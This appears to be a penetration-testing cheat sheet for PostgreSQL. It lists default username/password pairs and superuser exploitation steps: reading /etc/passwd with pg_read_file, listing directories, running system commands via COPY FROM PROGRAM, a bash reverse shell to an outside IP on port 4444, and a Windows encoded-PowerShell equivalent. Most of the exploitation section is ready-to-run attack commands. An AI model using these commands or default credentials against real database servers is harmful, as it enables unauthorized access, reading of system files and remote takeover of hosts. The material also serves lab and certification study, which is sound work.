PostgreSQL (5432/TCP)

PostgreSQL is an open-source object-relational database system. It is known for its robustness, extensibility, and compliance with SQL standards.

Usage

    Login into PostgreSQL

    psql -h 192.168.147.60 -p 5432 -U postgres

    Show databases

    postgres=# \l

    Select database

    postgres=# \c database_name

    Show tables

    postgres=# \dt

    Show permissions

    postgres=# \du      #In case you see "superuser" you are now the boss

Enumeration

    Default passwords

      admin:admin
postgres:postgres
postgres:password
postgres:admin
admin:password

Exploitation

    All these steps can only be performed if you are a superuser.

    Reading files

    select * from pg_read_file('/etc/passwd', 0, 1000000);

    Listing directories

    select * from pg_ls_dir('/tmp');

    Executing system commands

    DROP TABLE IF EXISTS cmd_exec;          #Prevents conflicts or errors when trying to create a table that already exists
CREATE TABLE cmd_exec(cmd_output text); #Creates a table named cmd_exec with one column cmd_output of type text.This table will store the output of the executed command 
COPY cmd_exec FROM PROGRAM 'id';        #Executes the id command on the server and inserts the output into the cmd_exec table
SELECT * FROM cmd_exec;                 #Displays the output stored in the cmd_exec table
DROP TABLE IF EXISTS cmd_exec;          #Deletes the cmd_exec table once it has served its purpose

    Performing reverse shell connection

    DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/192.168.45.241/4444 0>&1''';

    We can do the same with windows

    DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'cmd.exe /c powershell.exe -e BASE64_HERE';
